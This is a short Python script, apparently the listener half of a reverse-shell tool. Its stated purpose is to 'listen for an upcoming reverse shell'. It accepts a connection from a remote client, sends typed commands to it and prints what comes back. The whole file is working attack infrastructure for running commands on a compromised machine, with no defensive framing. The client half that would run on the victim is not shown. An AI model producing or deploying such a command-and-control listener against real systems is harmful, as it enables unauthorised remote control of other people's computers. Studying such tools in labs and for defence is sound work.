import socket
import argparse

parser = argparse.ArgumentParser(prog="server_side.py", description="listen for an upcoming reverse shell")
parser.add_argument("-p", "--port", type=int, default=1234, required=False)
args = parser.parse_args()

SERVER_HOST = "0.0.0.0" #all IPv4 addresses
SERVER_PORT = args.port
BUFFER_SIZE = 1024 #1kb, maximum amount of data to be received at once

#socket object
s = socket.socket()
#bind the socket to Ips and port
s.bind((SERVER_HOST, SERVER_PORT))
#listen for a connection
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

#accept a connection and return a new socket to send and receive data + address
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

while True:
    #get the command prompt
    command = input("#:")
    #send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        #if the command is exit, just break out of the loop
        break
    #retrieve command results
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)
#close connection to the client
client_socket.close()
#close server connection
s.close()